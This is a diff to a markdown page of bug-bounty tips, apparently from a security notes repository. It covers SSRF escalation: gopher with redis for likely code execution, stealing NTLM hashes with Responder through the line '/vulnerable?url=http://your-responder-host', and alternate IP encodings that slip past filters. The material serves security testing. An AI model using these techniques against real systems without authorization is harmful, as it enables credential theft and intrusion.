@@ -42,17 +42,31 @@ You might be able to get file read.
 <br>
 Or send multi-line requests to gain additional impact
 <br>
-(Ex: gopher + redis = likely RCE)
-<br>
+(Ex: gopher + redis = likely RCE)<br>
+
+
 2-Is the target running Windows?
 
 Can't hit internal services?
 
 (Well, try this even if you can)
 
-Try to steal NTLM hashes with Responder.<br>
+Try to steal NTLM hashes with Responder.
 
 `/vulnerable?url=http://your-responder-host`
+
+3-Try alternative representations of IP addresses.
+
+IPs can be represented in many ways including:
+
+• octal<br>
+• decimal<br>
+• hexadecimal<br>
+• etc.<br>
+
+Try different representations.
+
+You might get lucky.
 # Rate limit bypass
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
 # Line terminators
